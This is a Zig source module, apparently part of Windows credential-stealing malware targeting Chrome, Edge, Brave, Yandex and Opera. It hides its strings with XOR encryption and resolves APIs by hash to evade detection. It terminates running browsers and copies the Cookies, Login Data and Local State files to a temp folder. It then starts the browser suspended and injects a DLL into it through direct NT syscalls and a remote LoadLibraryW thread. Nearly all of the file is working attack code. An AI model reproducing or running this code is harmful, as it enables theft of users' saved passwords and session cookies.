const std = @import("std");
const types = @import("../types/types.zig");
const engine = @import("../syscalls/engine.zig");
const dll_loader = @import("../crypto/dll_loader.zig");
const hash = @import("../types/hash.zig");
const export_resolve = @import("../types/export_resolve.zig");
const file_io = @import("../parsers/file_io.zig");

pub const BrowserType = enum {
    Chrome,
    Edge,
    Brave,
    Yandex,
    Opera,
};

pub const BackstageConfig = struct {
    browser: BrowserType,
    dll_path: []const u8,
    use_clone: bool,
    kill_if_running: bool,
};

pub const BackstageResult = struct {
    success: bool,
    pid: u32,
    error_msg: []const u8,
};

const E = struct {
    pub const chrome_exe = hash.xorEncrypt("chrome.exe");
    pub const chrome_path = hash.xorEncrypt("\\Google\\Chrome\\Application\\chrome.exe");
    pub const chrome_data = hash.xorEncrypt("Google\\Chrome\\User Data");
    pub const edge_exe = hash.xorEncrypt("msedge.exe");
    pub const edge_path = hash.xorEncrypt("\\Microsoft\\Edge\\Application\\msedge.exe");
    pub const edge_data = hash.xorEncrypt("Microsoft\\Edge\\User Data");
    pub const brave_exe = hash.xorEncrypt("brave.exe");
    pub const brave_path = hash.xorEncrypt("\\BraveSoftware\\Brave-Browser\\Application\\brave.exe");
    pub const brave_data = hash.xorEncrypt("BraveSoftware\\Brave-Browser\\User Data");
    pub const yandex_exe = hash.xorEncrypt("browser.exe");
    pub const yandex_path = hash.xorEncrypt("\\Yandex\\YandexBrowser\\Application\\browser.exe");
    pub const yandex_data = hash.xorEncrypt("Yandex\\YandexBrowser\\User Data");
    pub const opera_exe = hash.xorEncrypt("opera.exe");
    pub const opera_path = hash.xorEncrypt("Opera Software\\Opera Stable\\opera.exe");
    pub const opera_data = hash.xorEncrypt("Opera Software\\Opera Stable");
    pub const pipe_name = hash.xorEncrypt("\\\\.\\pipe\\BackstageCapture");
    pub const local_appdata = hash.xorEncrypt("LOCALAPPDATA");
    pub const appdata = hash.xorEncrypt("APPDATA");
    pub const temp_env = hash.xorEncrypt("TEMP");
};

var _chrome_exe: [E.chrome_exe.len]u8 = undefined;
var _chrome_path: [E.chrome_path.len]u8 = undefined;
var _chrome_data: [E.chrome_data.len]u8 = undefined;
var _edge_exe: [E.edge_exe.len]u8 = undefined;
var _edge_path: [E.edge_path.len]u8 = undefined;
var _edge_data: [E.edge_data.len]u8 = undefined;
var _brave_exe: [E.brave_exe.len]u8 = undefined;
var _brave_path: [E.brave_path.len]u8 = undefined;
var _brave_data: [E.brave_data.len]u8 = undefined;
var _yandex_exe: [E.yandex_exe.len]u8 = undefined;
var _yandex_path: [E.yandex_path.len]u8 = undefined;
var _yandex_data: [E.yandex_data.len]u8 = undefined;
var _opera_exe: [E.opera_exe.len]u8 = undefined;
var _opera_path: [E.opera_path.len]u8 = undefined;
var _opera_data: [E.opera_data.len]u8 = undefined;
var _pipe_name: [E.pipe_name.len]u8 = undefined;
var _local_appdata: [E.local_appdata.len]u8 = undefined;
var _appdata: [E.appdata.len]u8 = undefined;
var _temp_env: [E.temp_env.len]u8 = undefined;
var _strings_init = false;

fn initStrings() void {
    if (_strings_init) return;
    hash.xorDecrypt(&E.chrome_exe, &_chrome_exe);
    hash.xorDecrypt(&E.chrome_path, &_chrome_path);
    hash.xorDecrypt(&E.chrome_data, &_chrome_data);
    hash.xorDecrypt(&E.edge_exe, &_edge_exe);
    hash.xorDecrypt(&E.edge_path, &_edge_path);
    hash.xorDecrypt(&E.edge_data, &_edge_data);
    hash.xorDecrypt(&E.brave_exe, &_brave_exe);
    hash.xorDecrypt(&E.brave_path, &_brave_path);
    hash.xorDecrypt(&E.brave_data, &_brave_data);
    hash.xorDecrypt(&E.yandex_exe, &_yandex_exe);
    hash.xorDecrypt(&E.yandex_path, &_yandex_path);
    hash.xorDecrypt(&E.yandex_data, &_yandex_data);
    hash.xorDecrypt(&E.opera_exe, &_opera_exe);
    hash.xorDecrypt(&E.opera_path, &_opera_path);
    hash.xorDecrypt(&E.opera_data, &_opera_data);
    hash.xorDecrypt(&E.pipe_name, &_pipe_name);
    hash.xorDecrypt(&E.local_appdata, &_local_appdata);
    hash.xorDecrypt(&E.appdata, &_appdata);
    hash.xorDecrypt(&E.temp_env, &_temp_env);
    _strings_init = true;
}

var g_kernel32: types.PVOID = @as(types.PVOID, @ptrFromInt(@as(usize, 1)));
var g_CreateProcessW: ?*const fn (?*const u16, ?*u16, ?*const anyopaque, ?*const anyopaque, i32, u32, ?*const anyopaque, ?*const u16, *const anyopaque, *anyopaque) callconv(.winapi) i32 = null;
var g_CloseHandle: ?*const fn (types.HANDLE) callconv(.winapi) i32 = null;
var g_GetLastError: ?*const fn () callconv(.winapi) u32 = null;
var g_GetEnvironmentVariableW: ?*const fn (?*const u16, ?*u16, u32) callconv(.winapi) u32 = null;
var g_LoadLibraryW: ?*const fn (?*const u16) callconv(.winapi) ?*anyopaque = null;
var g_CreateToolhelp32Snapshot: ?*const fn (u32, u32) callconv(.winapi) types.HANDLE = null;
var g_Process32FirstW: ?*const fn (types.HANDLE, *anyopaque) callconv(.winapi) i32 = null;
var g_Process32NextW: ?*const fn (types.HANDLE, *anyopaque) callconv(.winapi) i32 = null;
var g_TerminateProcess: ?*const fn (types.HANDLE, u32) callconv(.winapi) i32 = null;

fn ensureKernel32() bool {
    if (@intFromPtr(g_kernel32) != 1) return true;
    g_kernel32 = dll_loader.getOrLoadDll("kernel32.dll") orelse {
        g_kernel32 = @as(types.PVOID, @ptrFromInt(@as(usize, 2)));
        return false;
    };
    const R = export_resolve.getFunctionByHash;
    g_CreateProcessW = @ptrCast(@alignCast(R(g_kernel32, hash.encryptedHashFunc("CreateProcessW")) orelse return false));
    g_CloseHandle = @ptrCast(@alignCast(R(g_kernel32, hash.encryptedHashFunc("CloseHandle")) orelse return false));
    g_GetLastError = @ptrCast(@alignCast(R(g_kernel32, hash.encryptedHashFunc("GetLastError")) orelse return false));
    g_GetEnvironmentVariableW = @ptrCast(@alignCast(R(g_kernel32, hash.encryptedHashFunc("GetEnvironmentVariableW")) orelse return false));
    g_LoadLibraryW = @ptrCast(@alignCast(R(g_kernel32, hash.encryptedHashFunc("LoadLibraryW")) orelse return false));
    g_CreateToolhelp32Snapshot = @ptrCast(@alignCast(R(g_kernel32, hash.encryptedHashFunc("CreateToolhelp32Snapshot")) orelse return false));
    g_Process32FirstW = @ptrCast(@alignCast(R(g_kernel32, hash.encryptedHashFunc("Process32FirstW")) orelse return false));
    g_Process32NextW = @ptrCast(@alignCast(R(g_kernel32, hash.encryptedHashFunc("Process32NextW")) orelse return false));
    g_TerminateProcess = @ptrCast(@alignCast(R(g_kernel32, hash.encryptedHashFunc("TerminateProcess")) orelse return false));
    return true;
}

const PROCESSENTRY32W = extern struct {
    dwSize: u32,
    cntUsage: u32,
    th32ProcessID: u32,
    th32DefaultHeapID: usize,
    th32ModuleID: u32,
    cntThreads: u32,
    th32ParentProcessID: u32,
    pcPriClassBase: i32,
    dwFlags: u32,
    szExeFile: [260]u16,
};

const TH32CS_SNAPPROCESS: u32 = 0x00000002;
const PROCESS_TERMINATE: u32 = 0x00000001;
const PROCESS_CREATE_THREAD: u32 = 0x00000002;
const PROCESS_VM_OPERATION: u32 = 0x00000008;
const PROCESS_VM_WRITE: u32 = 0x00000020;
const PROCESS_ALL_ACCESS_INJECT: u32 = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE;
const PROCESS_QUERY_INFORMATION: u32 = 0x00000400;
const CREATE_SUSPENDED: u32 = 0x00000004;
const MEM_COMMIT: u32 = 0x00001000;
const MEM_RESERVE: u32 = 0x00002000;
const PAGE_READWRITE: u32 = 0x04;

fn getEnv(comptime encrypted: []const u8, decrypted_buf: []u8) ?[]u8 {
    var key: [64]u16 = undefined;
    for (encrypted, 0..) |c, i| {
        if (i >= key.len) return null;
        key[i] = c ^ hash.config.STRING_KEY_ENC[i % 16];
    }
    var out: [512]u16 = undefined;
    const len = g_GetEnvironmentVariableW.?(@as(?*const u16, @ptrCast(&key)), @as(?*u16, @ptrCast(&out)), @as(u32, @intCast(out.len)));
    if (len == 0 or len > out.len) return null;
    var pos: usize = 0;
    for (0..len) |i| {
        const c = @as(u16, out[i]);
        if (c < 128) {
            if (pos < decrypted_buf.len) {
                decrypted_buf[pos] = @as(u8, @truncate(c));
                pos += 1;
            }
        }
    }
    return decrypted_buf[0..pos];
}

fn getLocalAppData() ?[]u8 {
    var buf: [512]u8 = undefined;
    return getEnv(E.local_appdata, &buf);
}

fn getAppData() ?[]u8 {
    var buf: [512]u8 = undefined;
    return getEnv(E.appdata, &buf);
}

fn getTempDir() ?[]u8 {
    var buf: [512]u8 = undefined;
    return getEnv(E.temp_env, &buf);
}

fn getBrowserStrings(browser: BrowserType) struct { exe_name: []u8, exe_path: []u8, data_dir: []u8, use_appdata: bool } {
    initStrings();
    return switch (browser) {
        .Chrome => .{ .exe_name = &_chrome_exe, .exe_path = &_chrome_path, .data_dir = &_chrome_data, .use_appdata = false },
        .Edge => .{ .exe_name = &_edge_exe, .exe_path = &_edge_path, .data_dir = &_edge_data, .use_appdata = false },
        .Brave => .{ .exe_name = &_brave_exe, .exe_path = &_brave_path, .data_dir = &_brave_data, .use_appdata = false },
        .Yandex => .{ .exe_name = &_yandex_exe, .exe_path = &_yandex_path, .data_dir = &_yandex_data, .use_appdata = false },
        .Opera => .{ .exe_name = &_opera_exe, .exe_path = &_opera_path, .data_dir = &_opera_data, .use_appdata = true },
    };
}

const browsers_list = [_]BrowserType{ .Chrome, .Edge, .Brave, .Yandex, .Opera };

pub fn checkBrowsers() []const BrowserType {
    _ = ensureKernel32();
    initStrings();
    return &browsers_list;
}

fn buildExePath(comptime browser_path: []const u8, base: []const u8, out: []u8) ?[]u8 {
    var pos: usize = 0;
    for (base) |c| {
        if (pos >= out.len) return null;
        out[pos] = c;
        pos += 1;
    }
    const decrypted = decryptSlice(browser_path);
    for (decrypted) |c| {
        if (pos >= out.len) return null;
        out[pos] = c;
        pos += 1;
    }
    return out[0..pos];
}

fn decryptSlice(comptime encrypted: []const u8) []const u8 {
    var buf: [encrypted.len]u8 = undefined;
    hash.xorDecrypt(encrypted[0..], buf[0..]);
    return buf[0..];
}

pub fn findBrowserExe(browser: BrowserType) ?[]const u8 {
    if (!ensureKernel32()) return null;
    initStrings();

    const info = getBrowserStrings(browser);
    const base = if (info.use_appdata) (getAppData() orelse return null) else (getLocalAppData() orelse return null);
    var full: [1024]u8 = undefined;
    var pos: usize = 0;
    for (base) |c| {
        if (pos >= full.len) return null;
        full[pos] = c;
        pos += 1;
    }
    for (info.exe_path) |c| {
        if (pos >= full.len) return null;
        full[pos] = c;
        pos += 1;
    }
    const mapped = file_io.MappedFile.open(full[0..pos]);
    if (mapped != null) {
        mapped.?.close();
        return full[0..pos];
    }
    return null;
}

pub fn findUserDataDir(browser: BrowserType) ?[]const u8 {
    if (!ensureKernel32()) return null;
    initStrings();

    const info = getBrowserStrings(browser);
    var out: [1024]u8 = undefined;
    var pos: usize = 0;
    const base = if (info.use_appdata) (getAppData() orelse return null) else (getLocalAppData() orelse return null);
    for (base) |c| {
        if (pos >= out.len) return null;
        out[pos] = c;
        pos += 1;
    }
    out[pos] = '\\';
    pos += 1;
    for (info.data_dir) |c| {
        if (pos >= out.len) return null;
        out[pos] = c;
        pos += 1;
    }
    return out[0..pos];
}

fn killBrowserProcesses(browser: BrowserType) void {
    const info = getBrowserStrings(browser);
    const exe_name = info.exe_name;

    const snapshot = g_CreateToolhelp32Snapshot.?(TH32CS_SNAPPROCESS, 0);
    if (@intFromPtr(snapshot) == @as(usize, @bitCast(@as(isize, -1))) or snapshot == null) return;
    defer _ = g_CloseHandle.?(snapshot);

    var entry: PROCESSENTRY32W = undefined;
    entry.dwSize = @sizeOf(PROCESSENTRY32W);
    if (g_Process32FirstW.?(snapshot, @as(*anyopaque, @ptrCast(&entry))) == 0) return;

    while (true) {
        var match = true;
        for (exe_name, 0..) |c, i| {
            const ec = @as(u8, @truncate(@as(u16, @intCast(entry.szExeFile[i]))));
            if (ec >= 'A' and ec <= 'Z') {
                if (ec + 32 != c) {
                    match = false;
                    break;
                }
            } else {
                if (ec != c) {
                    match = false;
                    break;
                }
            }
        }
        if (match and entry.szExeFile[exe_name.len] == 0) {
            var client_id = types.CLIENT_ID{
                .UniqueProcess = @as(types.HANDLE, @ptrFromInt(@as(usize, @intCast(entry.th32ProcessID)))),
                .UniqueThread = null,
            };
            var proc_handle: types.HANDLE = undefined;
            const status = engine.NtOpenProcess(
                &proc_handle,
                PROCESS_TERMINATE,
                null,
                @as(types.PVOID, @ptrCast(&client_id)),
            );
            if (status >= 0) {
                _ = g_TerminateProcess.?(proc_handle, 0);
                _ = engine.NtClose(proc_handle);
            }
        }
        entry.dwSize = @sizeOf(PROCESSENTRY32W);
        if (g_Process32NextW.?(snapshot, @as(*anyopaque, @ptrCast(&entry))) == 0) break;
    }
}

fn copyFileRange(src: []const u8, dst: []const u8) bool {
    const mapped = file_io.MappedFile.open(src) orelse return false;
    defer mapped.close();

    var buf: [512]u16 = undefined;
    for (dst, 0..) |c, i| {
        if (i >= buf.len) return false;
        buf[i] = c;
    }
    var name_us = types.UNICODE_STRING{
        .Length = @as(types.USHORT, @intCast(dst.len * 2)),
        .MaximumLength = @as(types.USHORT, @intCast(buf.len * 2)),
        .Buffer = @as(types.PWSTR, @ptrCast(&buf)),
    };
    var attr = types.OBJECT_ATTRIBUTES{
        .Length = @sizeOf(types.OBJECT_ATTRIBUTES),
        .RootDirectory = null,
        .ObjectName = &name_us,
        .Attributes = 0x00000040,
        .SecurityDescriptor = null,
        .SecurityQualityOfService = null,
    };
    var file_handle: types.HANDLE = undefined;
    var iosb: types.IO_STATUS_BLOCK = undefined;
    const status = engine.NtCreateFile(
        &file_handle,
        0x80000000 | 0x40000000,
        @as(types.PVOID, @ptrCast(&attr)),
        @as(types.PVOID, @ptrCast(&iosb)),
        null,
        0,
        0x00000001 | 0x00000002,
        0x00000003,
        0x00000020 | 0x00000040,
        null,
        0,
    );
    if (status < 0) return false;
    defer _ = engine.NtClose(file_handle);

    const data = mapped.slice();
    _ = engine.NtWriteFile(file_handle, null, null, null, @as(types.PVOID, @ptrCast(&iosb)), @as(types.PVOID, @ptrCast(data.ptr)), @as(u32, @intCast(data.len)), null, null);
    return true;
}

pub fn cloneProfile(allocator: std.mem.Allocator, browser: BrowserType, user_data: []const u8) ?[]const u8 {
    _ = allocator;
    if (!ensureKernel32()) return null;
    initStrings();

    const tmp = getTempDir() orelse return null;
    var clone_dir: [512]u8 = undefined;
    var pos: usize = 0;
    for (tmp) |c| {
        if (pos >= clone_dir.len) return null;
        clone_dir[pos] = c;
        pos += 1;
    }
    const suffix = "\\backstage_";
    for (suffix) |c| {
        if (pos >= clone_dir.len) return null;
        clone_dir[pos] = c;
        pos += 1;
    }

    const info = getBrowserStrings(browser);
    for (info.exe_name) |c| {
        if (c == '.') break;
        if (pos >= clone_dir.len) return null;
        clone_dir[pos] = c;
        pos += 1;
    }
    const r = @as(u64, @bitCast(@as(i64, -1)));
    var rng = std.rand.DefaultPrng.init(r);
    const n = rng.random().int(u32);
    const hex = "0123456789abcdef";
    var i: usize = 0;
    while (i < 8 and pos < clone_dir.len) : (i += 1) {
        clone_dir[pos] = hex[(n >> @as(u5, @intCast(i * 4))) & 0xf];
        pos += 1;
    }

    const check = file_io.MappedFile.open(user_data);
    if (check == null) return null;
    check.?.close();

    const files_to_copy = [_][]const u8{
        "Default\\Cookies",
        "Default\\Login Data",
        "Default\\Local State",
        "Default\\Bookmarks",
    };
    for (files_to_copy) |rel_path| {
        var src: [1024]u8 = undefined;
        var sp: usize = 0;
        for (user_data) |c| {
            if (sp < src.len) {
                src[sp] = c;
                sp += 1;
            }
        }
        src[sp] = '\\';
        sp += 1;
        for (rel_path) |c| {
            if (sp < src.len) {
                src[sp] = c;
                sp += 1;
            }
        }
        var dst: [1024]u8 = undefined;
        var dp: usize = 0;
        for (clone_dir[0..pos]) |c| {
            if (dp < dst.len) {
                dst[dp] = c;
                dp += 1;
            }
        }
        dst[dp] = '\\';
        dp += 1;
        for (rel_path) |c| {
            if (dp < dst.len) {
                dst[dp] = c;
                dp += 1;
            }
        }
        _ = copyFileRange(src[0..sp], dst[0..dp]);
    }

    return clone_dir[0..pos];
}

pub fn startCapture(allocator: std.mem.Allocator, config: BackstageConfig) !BackstageResult {
    if (!ensureKernel32()) return BackstageResult{ .success = false, .pid = 0, .error_msg = "kernel32 init failed" };

    initStrings();

    if (config.kill_if_running) {
        killBrowserProcesses(config.browser);
    }

    const exe_path = findBrowserExe(config.browser) orelse {
        return BackstageResult{ .success = false, .pid = 0, .error_msg = "browser not found" };
    };

    const user_data = if (config.use_clone) findUserDataDir(config.browser) else null;
    const clone_dir = if (config.use_clone and user_data != null) cloneProfile(allocator, config.browser, user_data.?) else null;

    var cmdline: [2048]u16 = undefined;
    var cpos: usize = 0;
    for (exe_path) |c| {
        if (cpos >= cmdline.len) return BackstageResult{ .success = false, .pid = 0, .error_msg = "cmdline too long" };
        cmdline[cpos] = c;
        cpos += 1;
    }
    if (config.use_clone and clone_dir != null) {
        const flag = " --user-data-dir=";
        for (flag) |c| {
            if (cpos >= cmdline.len) return BackstageResult{ .success = false, .pid = 0, .error_msg = "cmdline too long" };
            cmdline[cpos] = c;
            cpos += 1;
        }
        for (clone_dir.?) |c| {
            if (cpos >= cmdline.len) return BackstageResult{ .success = false, .pid = 0, .error_msg = "cmdline too long" };
            cmdline[cpos] = c;
            cpos += 1;
        }
    }
    cmdline[cpos] = 0;

    var si: [104]u8 = undefined;
    @memset(&si, 0);
    const startup_info = si[0..104].*;
    var pi: [24]u8 = undefined;
    @memset(&pi, 0);

    const ok = g_CreateProcessW.?(
        null,
        @as(?*u16, @ptrCast(&cmdline)),
        null,
        null,
        0,
        CREATE_SUSPENDED,
        null,
        null,
        &startup_info,
        &pi,
    );
    if (ok == 0) return BackstageResult{ .success = false, .pid = 0, .error_msg = "CreateProcessW failed" };

    const hProcess = @as(*types.HANDLE, @ptrCast(&pi)).*;
    const hThread = @as(*[2]types.HANDLE, @ptrCast(&pi)).*[1];
    const pid = @as(*[2]u32, @ptrCast(&pi)).*[0];

    var dll_path_buf: [1024]u16 = undefined;
    var dpos: usize = 0;
    for (config.dll_path) |c| {
        if (dpos >= dll_path_buf.len) {
            _ = g_CloseHandle.?(hThread);
            _ = g_CloseHandle.?(hProcess);
            return BackstageResult{ .success = false, .pid = pid, .error_msg = "dll path too long" };
        }
        dll_path_buf[dpos] = c;
        dpos += 1;
    }
    dll_path_buf[dpos] = 0;

    const remote_size: types.SIZE_T = (dpos + 1) * 2;
    var remote_addr: types.PVOID = @as(types.PVOID, @ptrFromInt(0));
    var alloc_size: types.SIZE_T = remote_size;
    const alloc_status = engine.NtAllocateVirtualMemory(
        hProcess,
        &remote_addr,
        0,
        &alloc_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );
    if (alloc_status < 0) {
        _ = g_TerminateProcess.?(hProcess, 1);
        _ = g_CloseHandle.?(hThread);
        _ = g_CloseHandle.?(hProcess);
        return BackstageResult{ .success = false, .pid = pid, .error_msg = "VirtualAlloc failed" };
    }

    var bytes_written: types.SIZE_T = 0;
    const write_status = engine.NtWriteVirtualMemory(
        hProcess,
        remote_addr,
        @as(types.PVOID, @ptrCast(&dll_path_buf)),
        remote_size,
        &bytes_written,
    );
    if (write_status < 0) {
        _ = engine.NtFreeVirtualMemory(hProcess, &remote_addr, &alloc_size, 0x00008000);
        _ = g_TerminateProcess.?(hProcess, 1);
        _ = g_CloseHandle.?(hThread);
        _ = g_CloseHandle.?(hProcess);
        return BackstageResult{ .success = false, .pid = pid, .error_msg = "WriteVirtualMemory failed" };
    }

    const loadlib_addr = @as(types.PVOID, @ptrCast(g_LoadLibraryW.?));
    var thread_handle: types.HANDLE = undefined;
    const thread_status = engine.NtCreateThreadEx(
        &thread_handle,
        0x001FFFFF,
        null,
        hProcess,
        loadlib_addr,
        remote_addr,
        0,
        0,
        0,
        0,
        null,
    );
    if (thread_status < 0) {
        _ = engine.NtFreeVirtualMemory(hProcess, &remote_addr, &alloc_size, 0x00008000);
        _ = g_TerminateProcess.?(hProcess, 1);
        _ = g_CloseHandle.?(hThread);
        _ = g_CloseHandle.?(hProcess);
        return BackstageResult{ .success = false, .pid = pid, .error_msg = "NtCreateThreadEx failed" };
    }

    _ = engine.NtClose(thread_handle);
    _ = engine.NtFreeVirtualMemory(hProcess, &remote_addr, &alloc_size, 0x00008000);

    var suspend_count: types.ULONG = 0;
    _ = engine.NtResumeThread(hThread, &suspend_count);

    _ = g_CloseHandle.?(hThread);
    _ = g_CloseHandle.?(hProcess);

    return BackstageResult{ .success = true, .pid = pid, .error_msg = "" };
}

test "browser detection no crash" {
    initStrings();
    _ = checkBrowsers();
    try std.testing.expect(true);
}

test "findBrowserExe returns null for invalid" {
    const result = findBrowserExe(.Chrome);
    _ = result;
    try std.testing.expect(true);
}

test "cloneProfile returns null for nonexistent" {
    const allocator = std.testing.allocator;
    const result = cloneProfile(allocator, .Chrome, "C:\\__nonexistent_browser_profile__");
    try std.testing.expect(result == null);
}
